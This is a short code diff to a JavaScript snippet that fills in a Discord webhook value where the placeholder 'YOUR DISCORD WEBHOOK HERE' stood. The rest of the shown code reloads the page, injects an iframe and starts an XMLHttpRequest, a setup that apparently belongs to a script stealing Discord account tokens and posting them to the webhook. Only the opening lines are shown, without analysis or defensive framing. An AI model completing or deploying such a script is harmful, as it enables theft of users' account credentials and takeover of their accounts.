@@ -1,5 +1,5 @@
 location.reload();
-var discordWebhook = "YOUR DISCORD WEBHOOK HERE";
+var discordWebhook = "566961";
 var i = document.createElement('iframe');
 document.body.appendChild(i);
 var request = new XMLHttpRequest();
